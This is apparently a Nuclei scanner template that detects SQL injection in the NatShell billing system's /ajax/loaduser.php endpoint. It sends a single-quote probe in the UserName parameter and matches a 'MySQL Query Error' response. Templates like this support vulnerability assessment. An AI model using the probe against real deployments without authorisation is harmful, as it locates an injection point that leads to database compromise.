id: natshell-loaduser-sqli

info:
  name: NatShell loaduser.php - SQL Injection
  author: qwtd
  severity: high
  metadata:
    max-request: 1
  tags: 蓝海卓越计费管理系统

http:
  - method: GET
    path:
      - "{{BaseURL}}/ajax/loaduser.php?UserName=aaa%27"


    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "MySQL Query Error"

      - type: status
        status:
          - 200

